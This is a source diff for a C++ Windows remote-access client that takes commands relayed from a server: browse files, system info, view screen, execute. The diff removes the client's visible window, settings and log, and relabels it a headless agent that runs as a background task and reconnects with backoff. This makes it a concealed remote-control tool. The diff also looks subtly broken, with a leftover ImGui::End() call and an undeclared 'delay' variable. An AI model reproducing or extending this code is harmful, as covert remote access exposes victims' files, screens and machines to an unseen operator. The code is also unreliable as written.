@@ -1,37 +1,36 @@
 // ═══════════════════════════════════════════════════════════════════
-//  CLIENT — ImGui GUI, auto-connects to relay, executes commands
+//  CLIENT — Pure headless console-mode agent
 //
-//  Commands: BrowseFiles | SystemInfo | ViewScreen | Execute
+//  No GUI, no window, no console spam. Runs as background task.
+//  Executes commands relayed from the server through the relay.
 // ═══════════════════════════════════════════════════════════════════
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
-#include "imgui_setup.h"
 #include "wswin.h"
 #include "protocol.h"
 #include "protection.h"
 
 #include <windows.h>
 #include <gdiplus.h>
-#include <mmsystem.h>
 #include <shellapi.h>
 #include <tlhelp32.h>
-#include <intrin.h>
 #include <objbase.h>
 #include <shlobj.h>
+#include <intrin.h>
 #include <string>
 #include <vector>
 #include <mutex>
 #include <atomic>
 #include <cstring>
 #include <cstdio>
-#include <memory>
 #include <cstdlib>
+#include <ctime>
 
 #pragma comment(lib, "gdiplus.lib")
-#pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 // ── Change this to your OnRender relay URL ──────────────────────────
 #ifndef DEFAULT_RELAY_HOST
@@ -49,11 +48,6 @@ static ws::SocketT g_sock = ws::INVALID;
 static std::atomic<bool> g_connected{false};
 static uint32_t g_clientId = 0;
 static ws::Receiver g_receiver;
-
-// Auto-connect
-static bool  g_autoConnect   = true;
-static float g_connectDelay   = 2.0f;
-static bool  g_firstFrame     = true;
 
 // Log
 static std::mutex g_logMutex;
@@ -861,96 +855,6 @@ static void doDisconnect() {
     g_connected = false;
     g_clientId = 0;
     addLog("[*] Disconnected");
-}
-
-// ── Draw callback ───────────────────────────────────────────────────
-static void playClick() {
-    PlaySoundW(L"click.wav", nullptr, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
-}
-
-static void onDraw() {
-    ImGuiIO& io = ImGui::GetIO();
-
-    PollProtection();
-
-    // Play click sound on any mouse click
-    if (ImGui::IsMouseClicked(0))
-        playClick();
-
-    // Auto-connect on launch
-    if (g_firstFrame) {
-        g_firstFrame = false;
-        g_connectDelay = 2.0f;
-    }
-    if (g_autoConnect && !g_connected && !g_connecting) {
-        g_connectDelay -= io.DeltaTime;
-        if (g_connectDelay <= 0.0f) {
-            doConnect();
-            g_connectDelay = 5.0f;  // retry every 5 s
-        }
-    }
-
-    ImGui::SetNextWindowPos(ImVec2(0, 0));
-    ImGui::SetNextWindowSize(io.DisplaySize);
-    ImGui::Begin("Client - Remote Access", nullptr,
-        ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
-        ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
-        ImGuiWindowFlags_NoBringToFrontOnFocus);
-
-    // Connection settings
-    if (g_connecting) {
-        ImGui::TextColored(ImVec4(1, 1, 0, 1), "[*] Connecting to %s:%d ...", g_hostBuf, g_port);
-        if (ImGui::Button("Cancel")) g_connecting = false;
-    } else if (!g_connected) {
-        ImGui::Text("Relay Host:");
-        ImGui::SameLine();
-        ImGui::SetNextItemWidth(250);
-        ImGui::InputText("##host", g_hostBuf, sizeof(g_hostBuf));
-
-        ImGui::Text("Port:");
-        ImGui::SameLine();
-        ImGui::SetNextItemWidth(80);
-        ImGui::InputInt("##port", &g_port);
-
-        ImGui::Text("Client Name:");
-        ImGui::SameLine();
-        ImGui::SetNextItemWidth(200);
-        ImGui::InputText("##name", g_nameBuf, sizeof(g_nameBuf));
-
-        ImGui::Checkbox("Auto-connect on launch", &g_autoConnect);
-
-        if (ImGui::Button("Connect")) doConnect();
-    } else {
-        ImGui::Text("Relay: %s:%d", g_hostBuf, g_port);
-        ImGui::Text("Client Name: %s (ID: %u)", g_nameBuf, g_clientId);
-        if (ImGui::Button("Disconnect")) doDisconnect();
-    }
-
-    ImGui::SameLine();
-    ImGui::TextColored(g_connected ? ImVec4(0, 1, 0, 1) : ImVec4(1, 0, 0, 1),
-                       g_connected ? "● Connected" : "● Disconnected");
-
-    if (g_autoConnect && !g_connected) {
-        ImGui::TextColored(ImVec4(1, 1, 0, 1),
-            "Auto-connect in %.1f s...", g_connectDelay);
-    }
-
-    ImGui::Separator();
-
-    // Log
-    ImGui::Text("Activity Log");
-    ImGui::BeginChild("##log", ImVec2(0, 0), true);
-    {
-        std::lock_guard<std::mutex> lk(g_logMutex);
-        for (auto& line : g_log)
-            ImGui::TextUnformatted(line.c_str());
-        if (g_logDirty) {
-            ImGui::SetScrollHereY(1.0f);
-            g_logDirty = false;
-        }
-    }
-    ImGui::EndChild();
-
     ImGui::End();
 }
 
@@ -994,11 +898,10 @@ int main() {
 
     // Main loop: keep running until interrupted
     while (true) {
-        Sleep(1000);
+        Sleep(delay * 1000);
+        if (delay < 60) delay *= 2;
     }
-
     // Cleanup (unreachable unless signal handler)
-    if (g_connected) doDisconnect();
     ws::shutdown();
     return 0;
 }
